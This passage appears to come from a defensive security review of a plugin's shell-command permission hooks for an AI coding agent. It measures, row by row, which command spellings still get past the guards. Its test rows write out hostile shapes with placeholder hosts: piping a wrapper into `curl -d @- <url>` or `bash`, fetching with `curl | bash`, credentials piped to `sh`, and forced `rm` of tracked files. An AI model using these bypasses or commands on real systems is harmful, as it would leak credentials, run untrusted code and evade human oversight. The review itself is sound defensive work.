| l | The credentials guard matched the configured **basename as a substring of the whole piece**, so every path carrying it as a prefix or an infix was routed to the read-command test and granted under a reason string naming the CONFIGURED file — `<creds>.bak`, `<creds>X`, and `/tmp/notes-<creds base>-draft`, a path outside the repository entirely | capability | **OPEN**, and narrowed: the substring family is **CLOSED**, a same-named file elsewhere is not | The match is now **equality against the basename of a WORD** of the piece, which closes the family (l1–l6). What equality still admits is one file rather than a family: a **different** file whose basename IS the configured one (`/tmp/<creds base>`, l7–l8). Resolving that away needs the piece's own working directory, which no guard can know, and the attempt loses `cd <dir> && cat <creds base>` — the shape basename keying exists for. Bounded twice: the grant reaches only `CREDS_READ_COMMANDS`, so it is a read-only inspection under a mislabelled reason string and not a new capability; and it is unreachable outside a repository that has adopted the harness with `phases.qa` true. Cost of the narrowing is two rows in the other direction (l9–l10, §3.3's W22) | `allow-qa-credentials-read.sh`, **EQUALITY, AND THE ONE THING IT STILL ADMITS**, and the comment above `piece_names_creds`; §3.1's N108–N113 |

Row `h` was added with the bare-`&` separator rather than in this section's own round, and its rows are §3.1's rather than this section's `a1`–`e5` set; the rest of the table is unchanged and was not re-driven for it. Row `i` was added the same way, with the narrowing it was first published on, and carries its own measurement below — re-driven across three trees and extended when that narrowing turned out to close four spellings rather than the capability; the rest of the table is unchanged and was not re-driven for it either. Rows `j` and `k` were added the same way again, with the two header corrections that disclosed them, and carry their own measurement below; the rest of the table is unchanged and was not re-driven for them either. Row `l` was added the same way once more, with the fix that closed its substring half, and carries its own measurement below; the rest of the table is unchanged and was not re-driven for it either.

**One gap in this plugin's cover is deliberately not in that table**, because it is not a residual of the same kind: a `harness.config.json` that is **present but unreadable** puts the repository *outside* jurisdiction, so all seven probes go silent including the deny guard, and a push to a protected branch is not refused. It is a property of the jurisdiction test rather than of any matcher, it is measured as a row of §2.3's matrix with the fault injection that places it there, and it is stated to the adopter in `plugin/hooks/README.md`'s fail-closed section. Read it there; it is not restated here.

#### (a) The in-workspace symlink — open, and the bound is a capability comparison

| # | Piece (compound as §2.2's composition rule) | guard | decision |
|---|---|---|---|
| a1 | `<runner> --prefix <link> <sub>` | compounds | **allow** ← the residual |
| a2 | `<runner> --prefix <outside> <sub>` | compounds | SILENT ← the refusal it evades |
| a3 | `cd <link> && ls` | compounds | SILENT |
| a4 | `rm <link>/x` behind a safe piece | rewrite | SILENT |
| a5 | `rm <outside>/x` behind a safe piece | rewrite | SILENT |
| a6 | `<depInstall>`, the configured command, bare | compounds | **allow** |
| a7 | `<runner> --prefix <app_dir> <depInstall's subcommand>` | compounds | **allow** |

The residual is **narrower than its note implies**, and the narrowing is a measurement rather than a reading. Only the two rewrite helpers accept it: `git -C <link>` behind an anchor and `--prefix <link>` (a1). The `cd` arms do not (a3) — and not because of the symlink, since `cd <repo>/<any ordinary subdirectory> && ls` is equally SILENT: those arms are exact or space-suffixed spellings of the configured directories, so no path *below* them matches. `validate_rm_piece` does not either (a4), and there its second test is not textual at all: an `rm` operand must be in the index (`git ls-files --error-unmatch`), which a path reached through a link out of the repository cannot be. So the shape is confined to the two helpers whose note carries it.

**The bound, stated as a claim a row can falsify:** *the symlink grants no execution that in-repo write access does not already grant.* Writing `<link>` requires write access inside the repository; a6 and a7 show that anyone with that access can instead edit the app's own manifest, whose lifecycle scripts the configured `depInstall` runs under an `allow` in both spellings. The row that would break the bound is an `allow` on a1 reachable **without** in-repo write access, and there is none — a2 is the control showing that naming the outside directory directly is refused. Leave it open: closing it replaces a textual test with a physical resolution, which contradicts the **THEY ARE GLOBS, NOT FILESYSTEM LOOKUPS** contract, adds a fork per piece to a hook that fires on every Bash call, introduces a TOCTOU, and falsely refuses a legitimate directory reached through a symlinked path — common on macOS, where `/tmp` is itself one.

#### (b) The scoped `appDir` — open, and the cost is one spelling in each allow-only guard

| # | Piece, on the scoped fixture | guard | decision |
|---|---|---|---|
| b1 | `<runner> --prefix <scoped app_dir> <sub>` | compounds | **SILENT** ← the one prompt |
| b2 | `<runner> --prefix <scoped app_dir>` (tail-free) | compounds | allow |
| b3 | `cd <scoped app_dir> && git status` | compounds | allow |
| b4 | `<depInstall>`, bare | compounds | allow |
| b5 | b1's twin on the **unscoped** primary | compounds | allow ← the `@` is the whole cause |
| b6 | b1's shape ahead of a tracked `rm` | rewrite | **SILENT** |
| b7 | b2's shape ahead of a tracked `rm` | rewrite | allow |

**The bound, as a claim:** *the loss is exactly the `--prefix`-with-a-subcommand spelling, and nothing that does not carry a subcommand after the directory moves.* b2–b4 are the unaffected arms and b5 is the control that attributes b1's silence to the character rather than to the shape. b6/b7 extend the statement to the **rewrite** guard, which earlier rounds of this row had never been measured in: the same one spelling, the same prompt, because both guards reach the character class through the same helper. The tail-free arm survives because it is a literal `case` glob emitted by `hc_path_anchored_patterns` and never reaches the class at all. Leave it open, and do not widen the class to buy it back: the library's **DO NOT widen** note is the argument, and §2.2's F3 is the row that fails if someone does.

#### (c) Wildcard and set refspecs — closed, by three arms and two changes that had to compose

Reported as open; measured against the shipped guard, every spelling is refused. The arm column matters more than the decision column, because the six rows are **not** one closure:

| # | Command (`<repo>` on an ordinary branch) | decision | arm that refuses it |
|---|---|---|---|
| c1 | `git -C <repo> push <remote> refs/heads/*` | **deny** | the wildcard-refspec arm, after `${tok##*:}` / `${tok#+}` / `${tok#refs/heads/}` reduce the token to a `*`-bearing short name |
| c2 | `git -C <repo> push <remote> refs/heads/*:refs/heads/*` | **deny** | same arm, via the `:` destination strip |
| c3 | `git -C <repo> push <remote> 'refs/heads/*'` | **deny** | same arm, after the token is de-quoted |
| c4 | `git -C <repo> push --all <remote>` | **deny** | the `--all` / `--mirror` arm, which sits **ahead** of the generic `-*` flag arm so those two are not consumed as flags |
| c5 | `git -C <repo> push --mirror <remote>` | **deny** | same arm |
| c6 | `git -C <repo> push <remote> +<protected>` | **deny** | **not a set arm at all** — the `+` strip leaves the bare name, which the ordinary protected-set test refuses |
| c7 | `git -C <repo> push <remote> <feature>` | SILENT | control: a **named** ordinary push is not refused |
| c8 | `git -C <repo> push <remote> <feature>*` | **deny** | the wildcard arm again — a set is refused whatever it would have matched |
| c9 | `git -C <repo> push <remote> <protected>` | **deny** | control: the guard is live |

c6 is the row worth reading. It was reported alongside the wildcard spellings and it is refused, but by the protected-name test, and the fault injection below shows it does not move when the wildcard arm is removed. A future change that reworks the set arms and re-runs only these rows would read c6 as still-covered evidence for an arm it never touched.

**The closure needs two independent changes, and only one of them is visible from an ordinary directory.** The set-naming arms are one change; disabling filename expansion for the guard (`set -f`) is another, and without it the guard's `set -- $args` glob-expands an unquoted target against whatever directory the hook happens to run in, before any arm can judge it. Both are required, and the second is cwd-sensitive:

| Process cwd, by what `refs/heads/*` expands to there | shipped | `set -f` removed |
|---|---|---|
| matches nothing (the ordinary case) | **deny** | **deny** — the pattern survives unexpanded, so the defect is invisible |
| matches one ordinary branch name | **deny** | **SILENT** ← the missed refusal |
| a real `.git`, matching `<protected>` among others | **deny** | deny, but as a protected-**name** refusal, not a set refusal |

The quoted spelling (c3) does not move in any of the three, because the surviving quote characters make the token match no filename. Two changes, neither of which measured the other when it landed; this table is where their composition is recorded.

#### (d) The redirect target — open, and the bound is the whole prefix set

Disclosed by §2.1, which measured it as a divergence between the two guards. Here it is measured as a residual — how far it reaches, and what closing it locally would buy:

| # | Command | guard | decision |
|---|---|---|---|
| d1 | `git -C <repo> status && rm <repo>/<tracked> >/<outside>/x` | rewrite | **allow** ← the residual |
| d2 | the same with a space after `>` | rewrite | SILENT |
| d3 | `git -C <repo> status && rm <repo>/<tracked> 2>/dev/null` | rewrite | **allow** ← what the strip exists for |
| d4 | `git -C <repo> status && rm <outside>/x` | rewrite | SILENT ← the same path as an operand is refused |
| d5 | d1 with `>>` | rewrite | **allow** |
| d6 | d1 with `1>` | rewrite | **allow** |
| d7 | `git status >/<outside>/x && ls` | compounds | **allow** |
| d8 | `ls >/<outside>/x && ls` | compounds | **allow** |

**The bound, as a measurement rather than an example.** Driving `<prefix> >/<outside>/x && ls` through `allow-safe-compounds.sh` for **every** prefix `hc_safe_prefixes` resolves on the primary fixture — 45 of them, the 40-entry base set plus the five `commands.*` this configuration supplies — returns `allow` on **45 of 45**. The capability is therefore not a property of the rewrite guard's strip: it is a property of matching pieces by **leading words**, which both allow-only guards do by design. Refusing it in the rewrite guard alone would remove nothing an adopter's session can do, and would cost d3, an ordinary shape. Closing the class means validating redirect targets in both guards, which is a redesign with its own matrix — and the same bound is what makes it low-priority rather than urgent.

#### (e)–(g) The remaining inventory rows, re-confirmed rather than re-argued

Row (g) has no decision of its own — it is a property of the callers, argued in §2.1 — so it takes no row here.

| # | Shape | guard | decision |
|---|---|---|---|
| e1 | an unterminated quote before a `-C` directory | compounds | **allow** — residual (e), unchanged |
| e2 | the same piece ahead of a tracked `rm` | rewrite | **allow** |
| e3 | a **balanced** quote around a directory containing a space | compounds | SILENT — the exploitable spelling is refused, which is what bounds (e) |
| e4 | a lone literal backtick | compounds | SILENT — cost (f), unchanged |
| e5 | a quoted `$(` inside a `grep` pattern | compounds | SILENT — cost (f), unchanged |

#### (i) The credentials guard's read commands — closed by two arms, and the constant was only the first

`sort` and `uniq` were on `CREDS_READ_COMMANDS`, the set a piece **naming** the credentials file must lead with. Both write a file when told to: `sort -o <file>` / `--output=<file>`, `uniq <in> <out>`. Taking them off that constant refuses them **in command position only** — and this row was first published as CLOSED on that arm alone, while `cat <creds> | sort -o <out>` was still `allow`: the same second cleartext copy, at the caller's chosen path, under the reason string that calls the grant "Read-only inspection". `hc_split_command` reads no pipe, so no piece test can ever reach that tail; the arm that reaches it is the **whole-string refused-token scan**, which is exactly where `cp`, `tee`, `dd` and `truncate` are refused. Both names are on it now, and the row is closed on the pair.

Three trees, driven back to back in one session on §0's primary fixture with `phases.qa: true` and `qa.credentialsPath` set, using the guard's own REPRO payload: **pre** (neither arm), **constant** (the two entries off `CREDS_READ_COMMANDS` — the tree this row was first published against) and **shipped** (that, plus the two names on the token scan).

| # | Command | pre | constant | shipped |
|---|---|---|---|---|
| i1 | `sort -o /tmp/x <creds>` | **allow** | SILENT | SILENT |
| i2 | `sort --output=/tmp/x <creds>` | **allow** | SILENT | SILENT |
| i3 | `sort -o <creds> <creds>` (overwrite in place) | **allow** | SILENT | SILENT |
| i4 | `uniq <creds> /tmp/x` | **allow** | SILENT | SILENT |
| i5 | `cat <creds>` | allow | allow | allow |
| i6 | `grep -E '^ACCOUNT_1' <creds>` | allow | allow | allow |
| i7 | `head -5 <creds>` / `cut -d= -f2 <creds>` / `wc -l <creds>` / `ls -l <creds>` | allow | allow | allow |
| i8 | `cd <repo> && cat <creds>` | allow | allow | allow |
| i9 | `cat <creds> && git status` | allow | allow | allow |
| i10 | `cp <creds> /tmp/x` | SILENT | SILENT | SILENT — the control showing the refused-token arm was live in every run |
| i11 | `cat <creds> \| sort -o /tmp/x` | **allow** | **allow** ← the capability, undiminished by the first arm | SILENT |
| i12 | `cat <creds> \| uniq - /tmp/x` | **allow** | **allow** | SILENT |
| i13 | `cat <creds> $(sort -o /tmp/x <other file>)` | **allow** | **allow** | SILENT — the same scan inside a balanced substitution |
| i14 | `cat <creds> \| tee /tmp/x` | SILENT | SILENT | SILENT — the control the row's own comparison rests on: the four mutation tokens are refused in the **tail** in every column, which is what `sort` and `uniq` were not until the second arm |
| i15 | `cat <creds> \| sort` | **allow** | **allow** | SILENT ← the cost |
| i16 | `cat <creds> \| uniq` | **allow** | **allow** | SILENT ← the cost |
| i17 | `cat <creds> && ls \| sort` | **allow** | **allow** | SILENT ← the cost's widest shape: a benign `sort` in a compound that also reads the file |
| i18 | `git status \| sort` / `ls \| sort` / `cat <other file> \| sort` | SILENT | SILENT | SILENT — a command naming no configured basename was never this guard's to grant, so the two new names cost nothing outside the file they are about |
| i19 | `grep sortkey <creds>` / `cat <creds>.sorted` | allow | allow | allow — the word boundary does not fire on a name merely containing the letters |

**The bound:** i5–i9 are the whole read surface the shipped corpus spells and none of them moves in any column; i18 bounds the addition to commands that name the configured file, and i19 to the word rather than the letters. What the closure costs is i15–i17 — `cat <creds> | sort`, `| uniq`, and any compound naming the file that also names either binary — one prompt each, never a permit, and none of the three is spelled anywhere in the shipped corpus.

**One cost an adopter can hit without writing either word, disclosed rather than bought back.** The two names take the scan's **shared** boundary, not the narrow one `env` carries, so a `qa.credentialsPath` whose basename contains `sort` or `uniq` as a boundary-delimited word — `qa-sort.env` — loses this guard's allowance entirely: measured on a second fixture configured that way, `cat <creds>` and `grep -E … <creds>` both go SILENT where they were `allow`. The narrow boundary would buy that back and lose `cat <creds> | /usr/bin/sort -o <out>` with it, which is the capability the two names are here for. Silence is the fail-closed direction and the ordinary permission prompt still runs; the guard header carries the same note beside the `env` carve-out.

**Which arm produces which rows, by fault injection.** The two names taken back off the token scan and the whole set re-driven, direction shipped → variant: **i11–i13 and i15–i17 return to `allow`** and nothing else moves. i1–i4 hold SILENT, which is the first arm still refusing them in command position — so the constant and the scan are two arms, not one arm measured twice, and neither alone closes the row. Every keeper holds `allow` and every control holds SILENT.

Readmitting either name to `CREDS_READ_COMMANDS` still needs an option walk refusing every abbreviation of `-o` / `--output`, which is the enumerate-the-refused game `hc_piece_is_never_safe`'s header argues against; keeping them off it, and on the scan, is the cheaper end.

#### (j)–(k) The pipe and the balanced substitution — (j) closed by a construct scan, (k) open, and the bound is what reads the tail

`hc_split_command` reads `&&`, `||`, `;` and a bare `&`. A pipe and a balanced `$(…)` are none of those, so neither starts a piece: appended to a piece a guard permits, each would ride along on that piece's allow. Both headers had named the ride-along family as withdrawn without saying where the family stops.

**(j) is now closed, and the arm that closes it is not the split.** `autonomous-script-allowlist-guard.sh` scans the whole command string for the shell's composition grammar — `$(`, a backtick, `|`, `<`, a `${…}` that is not a bare `${IDENT}`, and a `>` that is neither a descriptor duplication nor a redirection to `/dev/null` — and exits silently on a match, before the repository or the configuration is resolved. Two of the six are scanned by **shape** rather than as a byte sequence, each because a whole-string refusal was measured costing a spelling the corpus or the flow's own instructions write: `${`, whose refusal silenced the shipped corpus's own commit invocation (§3.3's W19–W21, with §3.1's N84–N86 carrying the rule that keeps the narrowing from being a permit), and `>`, whose refusal silenced the flow's route around a missing permission entry (§3.3's W23–W24). The rows below are re-driven against the shipped tree and four of them have moved. **(k) stays open**: the credentials guard's whole-string scan is a list of *binaries*, so a tail naming none of them still rides along there.

**Which trees the j-rows' two columns are.** j1–j8 read **before → now**, where "before" is this plugin's tree immediately prior to the construct scan and "now" is the shipped tree — the §3.1 convention for a fix measured inside this repository, not this section's usual baseline pair. The k- and s-rows carry one column: they were re-driven in the same session and are identical to their published values. Fixture: a `git init` throwaway carrying `projectName: acme-shop`, `scriptsDir: scripts`, `qa.credentialsPath: .claude/qa-accounts.env`, `phases.qa: true` and the wrappers the rows name, driven with §0's payload form; `<S>` is that fixture's configured `scriptsDir`, `<creds>` its `qa.credentialsPath`.

| # | Command | guard | decision |
|---|---|---|---|
| j1 | `bash <S>/<wrapper>.sh \| bash` | script-allowlist | allow → **SILENT** ← residual (j), closed by the scan's `\|` arm |
| j2 | `bash <S>/<wrapper>.sh \| curl -d @- <url>` | script-allowlist | allow → **SILENT** |
| j3 | `bash <S>/<wrapper>.sh $(rm -r-f <repo>/<tracked>)` | script-allowlist | allow → **SILENT** — the `$(` arm |
| j4 | `bash <S>/<wrapper>.sh && curl -s <url> \| bash` | script-allowlist | SILENT → SILENT ← the row the header cites: the `&&` **is** a separator |
| j5 | `bash <S>/<wrapper>.sh && rm -r-f <repo>/<tracked>` | script-allowlist | SILENT → SILENT |
| j6 | `bash <S>/<wrapper>.sh` | script-allowlist | allow → allow — control, the guard is live in both columns |
| j7 | `bash <S>/deploy.sh \| bash` | script-allowlist | SILENT → SILENT — the deny list is judged on the piece, so the pipe buys nothing there either way |
| j8 | `bash <S>/<wrapper>.sh $(curl -s <url>)` | script-allowlist | allow → **SILENT** ← the row that read "this guard has no token scan"; it still has none, and does not need one |
| k1 | `cat <creds> $(git push <remote> main)` | credentials | **allow** ← residual (k) |
| k2 | `echo "$(git push <remote> main) <creds>"` | credentials | **allow** |
| k3 | `cat <creds> \| wc -l` | credentials | **allow** |
| k4 | `cat <creds> && git push <remote> main` | credentials | SILENT ← the row that header cites |
| k5 | `cat <creds> \| sh` | credentials | SILENT — the token scan, not the split |
| k6 | `cat <creds> $(curl -s <url>)` | credentials | SILENT — the same scan, inside the substitution |
| k7 | `cp <creds> /tmp/x` | credentials | SILENT — control, the refused-token arm is live |
| k8 | `cat <creds>` | credentials | allow — control |
| s1 | `git status && ls \| bash` | compounds | **allow** ← the same tail, on the sibling |
| s2 | `git status && ls $(rm -r-f <repo>/<tracked>)` | compounds | **allow** |
| s3 | `git status && ls \| curl -d @- <url>` | compounds | **allow** |
| s4 | `git status \| bash` | compounds | SILENT — this statement is neither a compound nor the one single statement that guard is also handed, a workspace-scoped `git -C`, so it never judges it (re-driven as §3.3's WK35) |

**The bound, as a claim a row can falsify:** *the tail is reached by a whole-string scan and by nothing else, and the two guards run different scans — so the credentials guard's residual is exactly the set of tails naming no refused **binary**, and the script-allowlist guard's is exactly the set of tails carrying no **construct**, which is empty for any tail that runs a second command.* k1–k3 are (k) still open: a tail whose binaries are unlisted rides along. k5 and k6 are that guard's scan refusing a tail in both positions, and (i)'s i11–i13 are the two write-capable names being taken **out** of the residual for exactly that reason — a tail may ride along, but not one that writes a second cleartext copy of the file the allow is about. j1–j3 and j8 are the construct scan, in the four positions that used to be (j). j7 bounds (j) from the other side and did so before the scan existed: a pipe does not launder a denied basename, because the deny list and the leading-words test are applied to the piece the wrapper is in.

**Why the two guards do not share one mechanism.** A binary list enumerates the attacker's tools — open-ended, and every unlisted binary is a gap, which is what k1–k3 measure. The construct set is closed and specified by POSIX, and it is sufficient because a bare binary in argument position is inert: `bash <S>/<wrapper>.sh curl` hands the string `curl` to a wrapper and runs nothing. The reverse import is what is refused, not the comparison: the credentials guard judges `cat <path>`, where a false-positive binary costs nothing, while the script-allowlist guard judges commands carrying prose and paths — a commit subject naming `sed`, a path component `node` — and a false positive in an allow-only guard is a prompt, which unattended is a stall. Adding a **short** list of unambiguous network and interpreter names on top of the construct scan is deferred, not rejected.

**(k) stays open, with the comparison it always had.** s1–s3 show `allow-safe-compounds.sh` granting the identical tail behind an ordinary safe prefix, so refusing it in the credentials guard alone would remove nothing a session can otherwise do; s4 marks that comparison's edge — the sibling declines every single statement **except a workspace-scoped `git -C`** (§3.3's W25–W26), and s4 is not one, so the single statement is still the shape (k) reaches and it does not. Those three rows are also now a **statement about the set rather than about (k) alone**: closing (j) makes the script-allowlist guard the *narrowest* of the three on a tail, and `allow-safe-compounds.sh` the widest. That asymmetry is the next thing this section should be asked about, and it is not this round's row.

#### (l) The credentials basename — the substring family closed, the same-named sibling open

Driven on §0's primary fixture, whose `qa.credentialsPath` is `.claude/qa-accounts.env`; `<creds>` is that file spelled absolutely unless a row says otherwise, `<creds base>` its basename. The two columns are **this plugin's tree immediately before the fix and immediately after**, back to back in one session — the pair §3.1's later blocks use, not the pre-extraction baseline. The before column IS the fault injection for this row: it differs from the shipped tree only in `piece_names_creds`, which tested the whole piece for the basename as a substring.

| # | Shape | before | after | what it establishes |
|---|---|---|---|---|
| l1 | `cat <creds>.bak` | **allow** | SILENT | the configured basename as a **prefix** of another path — the permit |
| l2 | `cat <creds>X` | **allow** | SILENT | the same with no separator at all |
| l3 | `cat /tmp/notes-<creds base>-draft` | **allow** | SILENT | the configured basename as an **infix**, on a path outside the repository — the serious row: a read of an arbitrary absolute path, reported as a read of the configured credentials file |
| l4 | `grep -E '^ACCOUNT_1' <creds>.bak` | **allow** | SILENT | the family was not one read command's — every entry of `CREDS_READ_COMMANDS` reached it |
| l5 | `head -n 5 <creds>.orig` | **allow** | SILENT | nor one suffix's |
| l6 | `cat .claude/<creds base>.bak`, relative | **allow** | SILENT | nor one spelling's |
| l7 | `cat /tmp/<creds base>` | allow | allow | **the residual that stays open**: a different file whose basename IS the configured one. Equality cannot tell it apart without the piece's working directory |
| l8 | `grep -E '^A' /tmp/<creds base>` | allow | allow | the same, on a second read command — l7 is not one command's |
| l9 | `cat <creds> && find <creds>.bak -delete` | SILENT | **allow** | the cost of the narrowing: a lookalike is now an ordinary path, judged by `hc_safe_prefixes` like any other. §3.3's W22 |
| l10 | `cut -d= -f2 <creds> && find <creds>.bak -delete` | SILENT | **allow** | the same, in the spelling the sibling guard does **not** also grant — the bound is W22's, not this row's |
| l11 | `cat <creds> && find /tmp/x -delete` | allow | allow | **the bound on l9–l10**: the identical shape naming a path the configured basename is not a substring of was granted on **both** trees. The guard never defended lookalikes as policy; the over-match defended them incidentally, and it is the same over-match that produced l1–l6 |
| l12 | `find /tmp/<creds base> -delete` | SILENT | SILENT | **the bound on l7–l8**, first half: the grant reaches only `CREDS_READ_COMMANDS`, so a same-named file elsewhere is no more deletable than the configured one |
| l13 | `cp /tmp/<creds base> /tmp/y`; `cat /tmp/<creds base> > /tmp/y`; `cat /tmp/<creds base> \| sh` | SILENT | SILENT | the same bound across the three refusal classes — the token scan and the redirect rule are whole-string and never saw the basename in the first place |
| l14 | `cat /tmp/<creds base>` with `cwd` in a `git init` repository carrying **no** `harness.config.json` | SILENT | SILENT | **the bound on l7–l8**, second half: the residual is unreachable outside a repository that has adopted the harness |
| l15 | `cat <creds>` | allow | allow | control — the guard was live in both columns |
| l16 | `cd <repo> && cat .claude/<creds base>` | allow | allow | control, and the reason equality is on the **basename** rather than a resolved path: this piece's working directory is the `cd`'s, which no guard can resolve per piece |

**The bound, as a claim a row can falsify:** *the match is equality on a word's basename, so the only file it confuses with the configured one is a file with the same name, and confusing it grants a read and nothing else.* l1–l6 are the family closed. l7 and l8 are what equality still admits; l12–l14 bound it to a read, inside jurisdiction. l9–l11 are the cost, and l11 is why it is a cost rather than a new capability.

**59 shapes driven per tree on the primary fixture, 118 decisions; 8 moved, 51 held** (21 `allow`, 30 SILENT), plus l14's own pair on a second, non-adopting fixture. Two runs of the driver are identical and the fixture configuration was byte-identical to its pristine copy afterwards.

#### Which claim each fault injection supports

Each variant is one line changed in the shipped tree, run over the whole 36-row set in the same session. Direction is shipped → variant. These support the **bounds**, not the decisions: a residual claimed bounded is only bounded if the bound moves when its cause does.

| Variant | rows that move | direction | what it establishes |
|---|---|---|---|
| the trailing-redirect `sed` removed from the rewrite guard | 4 — d1, d3, d5, d6 | allow → SILENT | closing (d) locally costs d3 and takes every redirect spelling with it — **while d7 and d8 do not move**, which is (d)'s bound demonstrated rather than asserted |
| the wildcard-refspec arm removed | 4 — c1, c2, c3, c8 | **deny → SILENT** | that arm alone closes (c)'s wildcard family. c4–c6 and c9 do not move: they are three other arms, and c6 in particular is not covered by the one under test |
| `set -f` removed from the deny guard | 0 over this row set; **1** under the cwd sweep above | deny → SILENT | the composition is real and is invisible from an ordinary directory — a row set taken from one cwd cannot see it, which is why the sweep is a table of its own |
| the path character class removed from **both** helpers | 2 — b1, b6 | SILENT → **allow** | (b)'s cost is produced by the class and by nothing else, in both allow-only guards |

**No control row moves under any variant** — a2, a5, a6, a7, b5, c7, c9, d4, d7, d8 and e3 hold their decision in all four — so the guards were live throughout, and every movement above is the leg under test rather than a fixture artefact.

#### What a later change owes this section

A change that closes one of these rewrites its inventory row to CLOSED **with the arm that closes it named**, and keeps the rows: a closed residual whose evidence is deleted becomes an open one again the next time someone reads the note that disclosed it. A change that *widens* one — buying back a cost — brings the whole row set, because every cost here is the price of a defence some other row depends on.

### 2.5 Directory de-quoting: the widening and its paired refusal

**Who reads this and what for:** anyone moving, removing or duplicating the one-line `-C` de-quote in `hc_git_piece_parts` (`plugin/hooks/lib/harness-config-lib.sh`). It answers two questions that had only ever been answered in a point-in-time review document — *what did de-quoting the directory grant, and what did it not grant?* — and it keeps them together on purpose. They are not one leg seen twice: the fault injection below shows that the single most obvious way to close the widening also takes two **refusals** with it, which is the shape of the mistake this section exists to prevent. Scope is the `-C` de-quote. The sibling `--prefix` one is a separate call inside `hc_runner_piece_in_workspace`, and its row is §2.2's K3.

**Outcome: the widening holds, the paired refusal holds twice over, and the widening is narrower than the word suggests.** Method as §0, on a tree carrying both parser rewrites and the configuration cache. 16 rows across three guards, plus a 33-subcommand quoted-versus-unquoted sweep and three fault injections. Every row was **measured against the current tree rather than carried over**: the disclosure that reported the widening predates both parser rewrites, so none of it was still evidence. Two runs of each driver are identical, the sweep is shown able to report a divergence rather than only able to report agreement, and the fixture configuration was byte-identical to its pristine copy afterwards.

**Composition.** §2.2's rule, and its **anchor note applies here in full** rather than being restated — with one consequence worth naming, because it is what makes most of these rows spellable at all: the de-quote runs *before* `hc_repo_dir_from_command` takes the first `-C` as the workspace anchor, so a quoted `-C` naming a directory that resolves is its own anchor and needs no leading piece. Q7–Q8 do take one, because their directories do not resolve; Q9–Q10 are those two written without it, and are anchor controls in exactly §2.2's sense.

#### The rows

| # | Command (§0's `<repo>`, `<remote>`, `<tracked>`, on `feat_probe`) | guard | decision | the leg that produced it |
|---|---|---|---|---|
| Q1 | `git -C "<repo>" status && ls` | compounds | **allow** ← the widening | the `hc_git_piece_parts` de-quote → the whitelist in `hc_git_piece_in_workspace` admits an ordinary directory → rewritten to `git status` → matches `hc_safe_prefixes` |
| Q2 | `git -C '<repo>' status && ls` | compounds | **allow** | the same; `hc_strip_quotes` peels either pair |
| Q3 | `git -C "<repo>" push --all <remote> && ls` | compounds | SILENT ← the refusal, layer 1 | **not** the directory tests: the de-quote and the whitelist both admit it and the rewrite *is* produced — `git push --all <remote>`, traced at helper level — and `hc_safe_prefixes` is what withholds |
| Q4 | the same command | deny | **deny** ← layer 2 | that guard's `--all` / `--mirror` arm, §2.4's c4, reached here through a quoted `-C` |
| Q5 | `git -C "<repo>" push --all <remote>`, uncompounded | deny | **deny** | the same arm; that guard has no compound prefilter |
| Q6 | `git -C "<repo>" rm <tracked>` | rewrite | **allow** | the de-quote, then the reconstruction `case` in `git-rewrite-branch-guard.sh`, which enumerates the quoted spellings |
| Q6b | `git -C '<repo>' rm <tracked>` | rewrite | **allow** | the single-quoted twin the same `case` enumerates |

#### Where de-quoting stops, and the anchor controls

| # | Command | guard | decision | what the de-quote leaves behind |
|---|---|---|---|---|
| Q7 | `git -C <repo> status && git -C "<repo>"/../evil status` | compounds | SILENT | the quote is not the outermost pair, so one leading `"` is peeled and an **embedded** one survives: the directory the tests judge is `<repo>"/../evil` |
| Q8 | `git -C <repo> status && git -C "<repo>/../evil" status` | compounds | SILENT | de-quotes **clean**, and the traversal survives the de-quote intact |
| Q9 | Q7 written with no leading anchor piece | compounds | SILENT | anchor control |
| Q10 | Q8 written with no leading anchor piece | compounds | SILENT | anchor control |

Q7 and Q8 are §2.2's C7 and C8. Which reject line refuses each — and that C7 carries three independent refusals while C8 has one — is measured there and is not re-derived here. What this section adds is the other half of the pair: these are the **two textually distinct outcomes the de-quote itself can have** on a hostile directory, one where a quote survives it and one where none does, and neither is reachable as an `allow`.

#### Positive controls

| # | Command | guard | decision | what it shows |
|---|---|---|---|---|
| Q11 | `git -C <repo> status && ls` | compounds | **allow** | Q1's unquoted twin |
| Q12 | `git -C <repo> push --all <remote>` | deny | **deny** | Q5's unquoted twin — §2.4's c4 |
| Q13 | `git -C <repo> rm <tracked>` | rewrite | **allow** | Q6's unquoted twin |
| Q14 | `git -C "<repo>" push <remote> feat_probe` | deny | SILENT | a **named ordinary** push behind a quoted `-C` is not refused, so Q4/Q5 are an arm firing rather than that guard refusing everything it sees a quote in |
| Q15 | `git -C "<repo>" push <remote> <protected>` | deny | **deny** | the ordinary protected-name test, reached through a quoted `-C` |

#### The widening is one of directory spelling, not of subcommand

The rewrite both helpers produce is `git <rest>`, identical whichever way the directory was written, so the quoted spelling cannot reach a subcommand the unquoted one does not. Measured rather than reasoned: every `git ` entry `hc_safe_prefixes` resolves on the primary fixture — 27 of the 45 — plus six subcommands deliberately **not** in that set (`push --all`, `reset --hard`, `checkout`, `clean -fd`, `commit -m`, `branch -D`), each driven three ways, unquoted and double-quoted and single-quoted. **All 33 agree across all three spellings**, the 27 at `allow` and the six SILENT. Run against the second variant below the same sweep reports 27 divergences, which is what makes the agreement a measurement rather than an instrument that can only report agreement.

**A second route now reaches that set, and it reaches the same one.** Every row of this section spells its compounds-guard commands as a compound, because a single statement did not reach that guard at all when they were taken. One shape does now — a workspace-scoped `git -C <dir> <subcommand>` on its own, §3.3's W25–W26 — and it is admitted into the **same** piece loop, so the sweep above is the standing evidence for what it grants and what it withholds rather than something owed a second time. Nothing in this section moves under it: the only rows here that are single statements answered by `allow-safe-compounds.sh` are the anchor controls Q9 and Q10, and both were re-driven against the new admission test and hold SILENT (§3.3's WK35) — their directories do not resolve, so neither becomes an anchor.

#### The bound is two layers deep, and only the second layer is load-bearing

Q3 and Q4/Q5 are the same command reaching two different guards on the same `PreToolUse` call — all six register under the one `Bash` matcher with no `if:` condition, as this file's opening paragraph states. The allow-only guard **withholds** its allow, and the deny guard **refuses**. That a deny from any hook beats every allow from every other is a property of the hook runner, stated in `plugin/hooks/README.md` and in `git-rewrite-branch-guard.sh`'s header; it is not something these payloads measure, and it is why the two layers are not equal. **Q4 and Q5 are the load-bearing rows.** Q3 moving to `allow` would change nothing a session can do while Q4/Q5 hold; Q4 or Q5 moving off `deny` would permit the command outright, whatever Q3 says. A change that re-runs only Q3 has checked the layer that does not matter.

#### Which leg produces each decision, by fault injection

Each variant is one change to the shipped tree, run over the whole row set in the same session. Direction is shipped → variant.

| Variant | rows that move | direction | what it establishes |
|---|---|---|---|
